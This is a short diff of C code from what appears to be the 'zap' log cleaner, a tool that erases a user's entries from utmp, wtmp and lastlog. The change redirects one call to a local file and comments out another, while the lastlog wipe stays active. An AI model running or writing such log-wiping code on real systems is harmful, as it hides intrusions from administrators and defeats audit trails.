@@ -69,8 +69,8 @@ int  argc;
 char *argv[];
 {
     if (argc==2) {
-        kill_tmp("/etc/utmp",argv[1]);
-        kill_tmp("/usr/adm/wtmp",argv[1]);
+        // kill_tmp("/etc/utmp",argv[1]);
+        kill_tmp("./wtmp",argv[1]);
         kill_lastlog(argv[1]);
         printf("Zap!\n");
     } else
